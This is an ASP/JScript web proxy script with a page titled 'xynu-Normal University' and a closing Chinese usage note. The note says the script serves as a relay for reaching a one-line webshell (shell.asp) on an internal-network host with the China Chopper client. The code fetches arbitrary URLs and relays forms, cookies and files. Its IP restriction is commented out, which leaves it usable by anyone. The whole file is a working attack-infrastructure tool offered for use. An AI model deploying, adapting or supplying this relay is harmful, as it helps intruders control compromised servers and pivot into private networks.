<%@LANGUAGE="JAVASCRIPT" CODEPAGE="65001"%>
<%Response.Charset = "utf-8"%>
<%Server.ScriptTimeout=5000%>
<%
Server.ScriptTimeout=10;
//var ip=String(Request.ServerVariables("REMOTE_ADDR"));
//if (ip.substr(0,6)!="10.153"){ Response.Write("<title>Error!</title>Your ip ["+ip+"] is not allowed!!");Response.End();}
 var Surl = String(Request.QueryString("url"));
var Stxt = String(Request.QueryString("txt"));
var Stype = String(Request.QueryString("type"));
var Scst = String(Request.QueryString("cst"));
var Scm = String(Request.QueryString("cm"));
var Scf = String(Request.QueryString("cf"));
var enableCookie = (Scf.charAt(0) == "2");
var enableForm = (Scf.charAt(1) == "2");
if(Stxt != "1" && Stxt != "2") Stxt = "0";
if(Stype != "0" && Stype != "2" && Stype != "3" && Stype != "4") Stype = "1";
if(Scst == "undefined") Scst = "gb2312";
if(Scm != "1" && Scm != "2") Scm = "0";
if(Scf != "11" && Scf != "22" && Scf != "21") Scf = "12";
if(Surl == "undefined" || Surl == ""){
  Response.AddHeader("Cookie","");
%>
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"
"http://www.w3.org/TR/html4/loose.dtd">
<html><head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
<title>xynu-Normal University</title>
<script type="text/javascript">
function radiovalue(name){
  var obj = document.getElementsByName(name);
  for(var k=0;k<obj.length;k++) if(obj[k].checked) return obj[k].value;}
function checkmode(x){
  var objx = document.getElementsByName("folder");
  for(var i=0;i<objx.length;i++) if(objx[i].value == x) return objx[i].checked = true;}
 function shell(){
  var url = document.getElementById("keyword").value;
  var flag = "?txt=" + (document.getElementById("dl").checked ? "2":"1" + "&type=" + radiovalue("up") + "&cm="+radiovalue("folder"));
   flag += "&cf=" + (document.getElementById("cookies").checked ? "2":"1") + (document.getElementById("forms").checked ? "2":"1");
   switch (radiovalue("go")){
    case "www": url = flag + "&url=" + url; break;
    case "google":url = flag + "&url=http://www.google.com.hk/search?q=" + encodeURI(url); break;
     case "baidu":url = flag + "&url=http://www.baidu.com/baidu?word=" + encodeURI(url) + "&ie=utf-8";
   }
  window.location.href = url;}
</script></head>
<body>
<form action="" onSubmit="shell();return false">
  <div align="center" style="font-size:12px">
  <input name="go" type="radio" value="www" onClick="checkmode('0')">Normal &nbsp;&nbsp;&nbsp;&nbsp;
   <input type="radio" name="go" value="baidu" checked onClick="checkmode('2')">Baidu &nbsp;&nbsp;&nbsp;&nbsp;
   <input type="radio" name="go" value="google"  onClick="checkmode('2')">Google <br>
   <input name="keyword" type="text" id="keyword" size="60"><br>
  <input name="dl" type="checkbox" id="dl">Download&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
   <input type="submit" value="    GO    ">&nbsp;&nbsp;  <input type="reset" value="  Reset  ">  <br>  <br>
   <span style="font-size:14px; font-weight:bolder; cursor:pointer" onClick="document.getElementById('opt').style.display=''">Options</span>
   <div id="opt" style="display:none ">  <strong>Forms And Cookie:</strong>
  <input type="checkbox" name="forms" id="forms" checked>Allow Submitting Forms
  <input type="checkbox" name="cookies" id="cookies" disabled>Enabled Cookies <br>  <strong>Update url:</strong>
   <input type="radio" name="up" value="0">Thoroughly
  <input type="radio" name="up" value="1" checked>All
  <input type="radio" name="up" value="2">Except Links
  <input type="radio" name="up" value="3">Only Scripts And Styles
  <input type="radio" name="up" value="4">Never <br>  <strong>url Fuzzy Judgment:</strong>
   <input name="folder" type="radio" value="0" checked>Auto
  <input type="radio" name="folder" value="1">Always
  <input type="radio" name="folder" value="2">Never</div>
</div></form>
  <CENTER>By Me 2012-4-8.</CENTER>

</body></html>
<%
}
else{
Surl = String(Request.QueryString).match(/url=(.*)$/)[1];
if (Surl.indexOf("?")==-1 && Surl.indexOf("&")!=-1){
  Surl=Surl.substr(Surl.indexOf("&")+1);
    if (Scst.match(/^gb/i)!=null){
      Response.CodePage = 936;
      var Surl = Surl.replace(/%E\w%\w\w%\w\w/ig,ConvChinese);
      Response.CodePage = 65001;
    }
  Surl = String(Request.QueryString("url")) +"?"+ Surl;
}
Surl = (Surl.substr(0,7) != "http://") ? "http://"+Surl : Surl;
if(Stxt == "0"){
  var preurl = Surl.replace(/[?#].*/,"");
  var t = preurl.lastIndexOf("/");
  preurl = preurl.substr(t+1);
  if (t > 6 && preurl.indexOf(".") > -1 && preurl.match(/\.(\S?htm|asp|php|jsp|cgi|wml)/i)==null) Stxt = "2";
 }
if(Stxt == "2") getRemoteFile()
else Response.Write(send_request());
}
function ConvChinese(x){
  var A=x.split("%");
  var i,j,DigS,Conv="";
  for (i=1;i<=3;i++)
    A=parseInt(A,16).toString(2);
  for (i=1;i<=3;i++){
    DigS=A.indexOf("0")+1;
    var Unicode="";
    for (j=1;j<DigS;j++){
      if (j==1){
        A=A.substr(DigS);
        Unicode+=A;
      } else {
        i++;
        A=A.substr(2);
        Unicode+=A;
      }
    }
    Conv+=String.fromCharCode(parseInt(Unicode,2));
  }
  return Server.URLEncode(Conv);
}
function Formmethodget(x){
  var url=x.match(/&url=([^\s"'>]+)/)[1];
  var init=x+'\n<input name="cst" type="hidden" value="'+Scst+'">\n';
  init +='<input name="type" type="hidden" value="'+Stype+'">\n<input name="cm" type="hidden" value="'+Scm+'">\n';
   init +='<input name="cf" type="hidden" value="'+Scf+'">\n<input name="url" type="hidden" value="'+url+'">\n';
   return init;
}
function send_request() {
  var codedtext,http_request;
  var Cookie = String("" + Response.Cookies);
  try{
  if (enableForm && (String(Request.Form)!="undefined")){
    if (Scst.match(/^gb/i)!=null){
      Response.CodePage = 936;
      var Formdata = String(Request.Form).replace(/%E\w%\w\w%\w\w/ig,ConvChinese);
       Response.CodePage = 65001;
    } else {
      var Formdata = String(Request.Form);
    }
    http_request = Server.CreateObject("MSXML2.XMLHTTP");
    http_request.Open("POST",Surl,false);
    if (enableCookie && (Cookie != "")){
      http_request.setRequestHeader("Referer",String(Request.QueryString("parent")));
       http_request.setRequestHeader("Cookie",Cookie);
    }
    http_request.setRequestHeader("CONTENT-TYPE","application/x-www-form-urlencoded");
     http_request.Send(Formdata);
  } else {
    http_request = Server.CreateObject("Microsoft.XMLHTTP");
    http_request.Open("GET",Surl,false);
    if (enableCookie && (Cookie != "")){
      http_request.setRequestHeader("Referer",String(Request.QueryString("parent")));
       http_request.setRequestHeader("Cookie",Cookie);
    }
    http_request.Send(null);
  }
  }
  catch(e)
  {
  Response.Write("<title>Error!</title>" + e.description);
  Response.Write("<br><a href='?url='>重新输入</a> <a href='javascript:history.go(-1)'>后退</a> ");
   Response.Write("<a href='javascript:window.location.reload()'>刷新</a> <a href='javascript:window.close()'>关闭窗口</a>");
   Response.End();
  }
  if (http_request.ReadyState == 4){

    //自动判断编码开始
    var charresult = http_request.ResponseText.match(/["';\s]CharSet\s*=\s*(\S+?)["';>\s]/i);
     if (charresult != null){
      var Cset = charresult[1];
      Scst = Cset;
    }else{Cset = Scst}
    //自动判断编码结束
    codedtext = bytesToBSTR(http_request.Responsebody,Cset);
    Response.AddHeader("Cookie",http_request.getResponseHeader( "Set-Cookie" ));
     if(Stype < 4){
      var baseurl = codedtext.match(/<base[^>]+href\s*=\s*(["']?)(http:\/\/[^"'\s]+?)\1[^>]*>/i);
       if(baseurl != null) Surl = baseurl[2];
      codedtext = codedtext.replace(/<base[^>]*>/i,"");
      var preurl = String(Request.QueryString("parent"));
      var preurl_1 = preurl_2 = (preurl == "undefined" || preurl == "") ? Surl.replace(/[?#].*/,"") : preurl;
       var t = preurl_2.lastIndexOf("/");
      if(Scm !="1" && t != 6){
        if(Scm =="2" || preurl_2.substr(t).indexOf(".") != -1){
          preurl_2 = preurl_2.substr(0,preurl_2.lastIndexOf("/"));
        }
        if(preurl_2.charAt(preurl_2.length-1) == "/"){
          preurl_2 = preurl_2.substr(0,preurl_2.length-1);
        }
      }

//      codedtext = codedtext.replace(/%(\w\w)%/ig,"%25$1%25");
//      codedtext = codedtext.replace(/([^&])&(?=[a-z])/ig,"$1%26");
//      codedtext = codedtext.replace(/%26(copy|quot|amp|lt|gt|nbsp|raquo|laquo)/ig,"&$1");

      if(Stype == 3){
        codedtext = codedtext.replace(/(<(?:link|script)\s[^>]*(?:href|src))\s*=\s*(?=[^'"\s])/ig,"$1=@");
         //codedtext = codedtext.replace(/(<(?:link|script)\s+[^>]*(?:href|src)\s*=\s*['"@])\?/ig,"$1"+preurl_1+"?");
         codedtext = codedtext.replace(/(<(?:link|script)\s[^>]*(?:href|src)\s*=\s*['"@])\/?(?!http:\/{2})/ig,"$1"+preurl_2+"/");
         codedtext = codedtext.replace(/(<(?:link|script)\s[^>]*(?:href|src)\s*=\s*['"@])/ig,"$1?cst="+Scst+"&type=4&txt=1&url=");
         codedtext = codedtext.replace(/(href|src)\s*=\s*@/ig,"$1=");
      } else {
        codedtext = codedtext.replace(/(<(?!a\s)[^>]*[\s"';](?:href|src|location|url|background))\s*=\s*(?=[^'"\s])/ig,"$1=@");
         codedtext = codedtext.replace(/(<(?!a\s)[^>]*[\s"';](?:href|src|location|url|background)\s*=\s*['"@])\?/ig,"$1"+preurl_1+"?");
         codedtext = codedtext.replace(/(<(?!a\s)[^>]*[\s"';](?:href|src|location|url|background)\s*=\s*['"@])\/?(?!#|mailto:|javascript:|http:\/{2})/ig,"$1"+preurl_2+"/");

        codedtext = codedtext.replace(/(<link\s[^>]*href\s*=\s*['"@])(?=http:\/{2})/ig,"$1?cst="+Scst+"&type=4&txt=1&url=");
         codedtext = codedtext.replace(/(<script\s[^>]*src\s*=\s*['"@])(?=http:\/{2})/ig,"$1?cst="+Scst+"&txt=1&cm="+Scm+"&type="+(Stype==0?"0&parent="+preurl_1:"4")+"&url=");
         codedtext = codedtext.replace(/(<(?:frame|iframe)\s[^>]*(?:href|src)\s*=\s*['"@])(?=http:\/{2})/ig,"$1?cst="+Scst+"&type="+Stype+"&txt=1&cm="+Scm+"&cf="+Scf+"&url=");
         codedtext = codedtext.replace(/(<(?!link\s|a\s)[^>]*[\s"';](?:href|location|url)\s*=\s*['"@])(?=http:\/{2})/ig,"$1?cst="+Scst+"&type="+Stype+"&txt=1&cm="+Scm+"&cf="+Scf+"&url=");
         codedtext = codedtext.replace(/(<(?:img|input|embed)\s[^>]*src\s*=\s*['"@])(?=http:\/{2})/ig,"$1?txt=2&url=");
         codedtext = codedtext.replace(/(<(?!a\s)[^>]*[\s"';]background\s*=\s*['"@])(?=http:\/{2})/ig,"$1?txt=2&url=");
         codedtext = codedtext.replace(/(<(?!script\s|frame\s|iframe\s|img\s|input\s|embed\s)[^>]*[\s"';]src\s*=\s*['"@])(?=http:\/{2})/ig,"$1?cst="+Scst+"&type="+Stype+"&cm="+Scm+"&url=");

        //img inner CSS
        codedtext = codedtext.replace(/(background\s*:\s*url\()\/?(?!http:\/\/)/ig,"$1"+preurl_2+"/");
         codedtext = codedtext.replace(/(background\s*:\s*url\()/ig,"$1?txt=2&url=");
         //the [端口,被屏蔽] flash
        codedtext = codedtext.replace(/(<param\s+name.*(?:filename|movie).*value)\s*=\s*(?=[^'"\s])/ig,"$1=@");
         codedtext = codedtext.replace(/(<param\s+name.*(?:filename|movie).*value\s*=\s*['"@])\/?(?!http:\/{2})/ig,"$1"+preurl_2+"/");
         codedtext = codedtext.replace(/(<param\s+name.*(?:filename|movie).*value\s*=\s*['"@])(?=http:\/{2})/ig,"$1?txt=2&url=");

        if(Stype < 2){
          codedtext = codedtext.replace(/(<a\s[^>]*href)\s*=\s*(?=[^'"\s])/ig,"$1=@");
           codedtext = codedtext.replace(/(<a\s[^>]*href\s*=\s*['"@])\?/ig,"$1"+preurl_1+"?");
           codedtext = codedtext.replace(/(<a\s[^>]*href\s*=\s*['"@])\/?(?!#|mailto:|javascript:|http:\/{2})/ig,"$1"+preurl_2+"/");
           codedtext = codedtext.replace(/(<a\s[^>]*href\s*=\s*['"@])(?=http:\/{2})/ig,"$1?cst="+Scst+"&type="+Stype+"&cm="+Scm+"&cf="+Scf+"&url=");

          if(enableForm){
            codedtext = codedtext.replace(/(<form\s[^>]*?action)\s*=\s*(?=[^'"\s])/ig,"$1=@");
             codedtext = codedtext.replace(/(<form\s[^>]*?action\s*=\s*['"@])\?/ig,"$1"+preurl_1+"?");
             codedtext = codedtext.replace(/(<form\s[^>]*?action\s*=\s*['"@])\/?(?!#|mailto:|javascript:|http:\/{2})/ig,"$1"+preurl_2+"/");
             codedtext = codedtext.replace(/(<form\s[^>]*?action\s*=\s*['"@])(?=http:\/{2})/ig,"$1?cst="+Scst+"&type="+Stype+"&cm="+Scm+"&cf="+Scf+"&parent="+preurl_1+"&url=");
             codedtext = codedtext.replace(/<form[^>]+method\s*=\s*(["']?)get\1[^>]*>/ig,Formmethodget);
           }
        }
        codedtext = codedtext.replace(/(href|action|src|value|location|url|background)\s*=\s*@/ig,"$1=");
         while(codedtext.match(/\/[^\/\.]+\/\.\.\//)!=null) codedtext = codedtext.replace(/\/[^\/\.]+\/\.\.\//, "/");
       }
    }
  }else{
    codedtext = "<title>Error!</title>";
    codedtext += "<a href='?url='>重新输入</a> <a href='javascript:history.go(-1)'>后退</a> ";
     codedtext += "<a href='javascript:window.location.reload()'>刷新</a> <a href='javascript:window.close()'>关闭窗口</a>"
   }

  return(codedtext);
}
function bytesToBSTR(body,Cset){
  var objstream;
  objstream = Server.CreateObject("Adodb.Stream");
  objstream.Type = 1;
  objstream.Mode = 3;
  objstream.Open();
  objstream.Write(body);
  objstream.Position = 0;
  objstream.Type = 2;
  objstream.Charset = Cset;
  bytesToBSTR = objstream.Readtext;
  objstream.Close;
  return(bytesToBSTR);
}
function getRemoteFile(){
  var Retrieval;
  Retrieval = Server.CreateObject("Microsoft.XMLHTTP");
  try{
  Retrieval.Open("GET",Surl,false);
  Retrieval.Send(null);
  }
  catch(e)
  {
  Response.Write("<title>Error!</title>" + e.description);
  Response.Write("<br><a href='?url='>重新输入</a> <a href='javascript:history.go(-1)'>后退</a> ");
   Response.Write("<a href='javascript:window.location.reload()'>刷新</a> <a href='javascript:window.close()'>关闭窗口</a>");
   Response.End();
  }
  if (Retrieval.ReadyState == 4){
    var preurl = Surl.replace(/[?#].*/,"");
    var t = preurl.lastIndexOf("/");
    preurl = preurl.substr(t+1);
    if (t == 6 || preurl.indexOf(".") == -1) preurl = "default.htm";
    Response.AddHeader("Content-Disposition","attachment; filename="+preurl);
    Response.ContentType = "application/octet-stream";
    Response.BinaryWrite(Retrieval.Responsebody);
    Retrieval.Close;
  } else {
    Response.Write("<title>Error!</title><a href='?url='>重新输入</a> <a href='javascript:history.go(-1)'>后退</a> ");
     Response.Write("<a href='javascript:window.location.reload()'>刷新</a> <a href='javascript:window.close()'>关闭窗口</a>");
   }
}
%>
使用方法：（http://www.bbb.com/shell.asp 为内网中的一句话）

http://www.aaa.com/p.asp?txt=1&type=1&cm=0&cf=12&url=http://www.bbb.com/shell.asp

http://www.aaa.com/p.asp 为此中转程序。

菜刀的其它配置不需要修改。